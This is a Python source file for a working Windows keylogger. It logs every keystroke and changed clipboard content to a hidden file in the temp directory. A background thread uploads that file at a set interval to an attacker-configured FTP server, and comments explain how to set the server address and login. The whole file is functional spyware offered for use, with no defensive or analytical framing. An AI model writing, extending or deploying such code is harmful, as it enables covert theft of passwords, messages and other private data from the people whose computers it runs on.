# Windows


# import modules
from tempfile import gettempdir
from os import system,name
from os.path import isfile
import threading
from pynput import keyboard
from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
from datetime import datetime
from ftplib import FTP   # for sending the data to the ftp server
from time import sleep


# <-- Initializing global values -->

# change this
SERVER_ADDRESS = ("192.168.29.54", 2121)        # replace the IP with your server's IP 
INTERVAL = 10                                   # set interval according to your requirement
USER = ''                                       # FTP Username
PASSWD = ''                                     # FTP Password



# <---  no change required   --->
duplicate = ['']

# Windows
temp_dir = gettempdir()
FILENAME = f'{temp_dir}\\{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'


#keystroke record
class keylogger:

    # init
    def __init__(self):
        pass

    # saving the file
    def savefile(self,data):
        try:
            file_exists = isfile(FILENAME)

            with open(FILENAME,'a+') as fh:
                fh.write(str(data))
            
            if not file_exists and name == 'nt':  # check if the system is Windows and file didn't exist before
                system(f'attrib +h {FILENAME}')
        except:
            pass
    

    def Keylogging(self):
        def on_key_press(key):
            try:
                # to get the clipboard data
                data = paste()

                if data != duplicate[0]:
                    self.savefile(f'Clipboard data: {data}\n')
                    duplicate[0] = data

                # logging the keystrokes
                self.savefile(f'{str(key)}\n')

            except:
                pass


        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


    # destructor
    def __del__(self):
        pass


# send the file to the ftp server at regular interval
class ftpuploader:
    
    # init
    def __init__(self):
        self.ftp = FTP()
        self.ftp.connect(SERVER_ADDRESS[0], SERVER_ADDRESS[1])  # Connect to the FTP server   
        self.ftp.login(user=USER, passwd=PASSWD)
    
    def upload_file_periodically(self):
        while True:
            sleep(INTERVAL)
            
            try:
                with open(FILENAME, 'rb') as fh:
                    self.ftp.storbinary(f'STOR {FILENAME}', fh)   # sending the file to the ftp server
            
            except Exception as e:
                pass

    # ftp close
    def __del__(self):
        self.ftp.quit()




if __name__=='__main__':
    try:
        # creating objects
        keylogger  = keylogger()
        ftp_uploader = ftpuploader()

        # <---  implementing threading  ---> 
       
        # starting the keylogger and daemon = True (to run it in the background)
        keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
        keylogger_thread.start() 


        # sending file periodically and daemon = True (to run it in the background)
        ftp_uploader_thread = threading.Thread(target = ftp_uploader.upload_file_periodically, daemon = True)
        ftp_uploader_thread.start()


        keylogger_thread.join()
        ftp_uploader_thread.join()   
    
    except KeyboardInterrupt:
        pass

